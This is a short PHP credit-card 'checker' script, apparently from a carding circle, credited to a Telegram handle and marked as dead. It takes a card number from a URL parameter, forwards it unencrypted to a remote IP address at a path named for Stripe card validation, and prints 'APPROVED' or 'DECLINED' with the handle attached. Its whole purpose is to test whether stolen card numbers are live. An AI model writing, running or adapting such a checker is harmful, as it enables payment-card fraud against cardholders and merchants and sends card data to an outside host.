<?php
//script by @xancheck
// DEAD SCRIPT DONT USE


$cc = $_GET['cc'];


if(isset($cc) && !empty($cc)) {

    $apiUrl = "http://51.20.124.87/stripe/cardvalid.php?cc=$cc";


    $response = file_get_contents($apiUrl);


    if (strpos($response, 'Live') !== false) {
        echo "APPROVED - $cc - t.me/xancheck";
    } elseif (strpos($response, 'error') !== false) {
        echo "DECLINED - $cc - t.me/xancheck";
    } else {
        echo "Status not recognized in the response.";
    }
} else {
    echo "Missing 'cc' parameter in the URL.";
}
?>
